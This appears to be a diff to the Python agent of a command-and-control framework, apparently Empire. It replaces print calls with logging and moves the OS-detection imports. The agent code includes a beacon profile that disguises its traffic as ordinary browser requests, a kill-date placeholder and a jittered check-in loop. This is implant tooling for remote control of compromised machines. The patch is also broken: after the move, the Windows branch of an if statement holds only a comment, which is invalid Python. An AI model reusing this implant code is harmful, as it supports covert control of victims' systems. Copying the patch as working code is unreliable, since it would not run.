@@ -23,22 +23,12 @@ import shutil
 import socket
 import math
 import stat
+import logging
 #import grp
 from stat import S_ISREG, ST_CTIME, ST_MODE
 from os.path import expanduser
 from StringIO import StringIO
 from threading import Thread
-
-#Windows specific imports
-import platform
-OS_TYPE = platform.system()
-print(OS_TYPE)
-if OS_TYPE == "Windows":
-    print("Windows detected")
-    #import winpwd as pwd
-else:
-    import grp, pwd
-
 
 ################################################
 #
@@ -52,15 +42,6 @@ else:
 #   tasking uris | user agent | additional header 1 | additional header 2 | ...
 # Original profile
 profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
-# Customised profile
-# REQ_HEADERS = ("/search?q=news&go=Search&qs=bs&form=QBRE,"
-#            "/search?q=weather&go=Search&qs=bs&form=QBRE,"
-#            "/search?q=movie%20tickets&go=Search&qs=bs&form=QBRE,"
-#            "/search?q=unit%20conversion&go=Search&qs=bs&form=QBRE")
-# UA_STRING = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
-# ADDITION_HEADERS = ["Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-#            "Cookie:DUP=Q=GpO1nJpMnam4UllEfmeMdg2&T=283767088&A=1&IG"]
-# profile = "|".join([REQ_HEADERS, UA_STRING] + ADDITION_HEADERS)
 
 server = server.rstrip("/") #Remove trailing slash
 #if server.endswith("/"): server = server[0:-1]
@@ -72,6 +53,17 @@ missedCheckins = 0
 jobMessageBuffer = ''
 currentListenerName = ""
 sendMsgFuncCode = ""
+loglevel = "WARNING"
+logging.basicConfig(level=loglevel)
+
+#Windows specific imports
+import platform
+OS_TYPE = platform.system()
+logging.info("OS Detected: %s" % OS_TYPE)
+if OS_TYPE == "Windows":
+    #import winpwd as pwd
+else:
+    import grp, pwd
 
 # killDate form -> "MO/DAY/YEAR"
 killDate = 'REPLACE_KILLDATE'
@@ -1049,7 +1041,7 @@ while(True):
         maxSleep = int((1.0+jitter)*delay)
 
         sleepTime = random.randint(minSleep, maxSleep)
-        print("[Pulse]: Sleep %d" % sleepTime)
+        logging.info("[Pulse]: Sleep %d" % sleepTime)
         time.sleep(sleepTime)
 
         (code, data) = send_message()
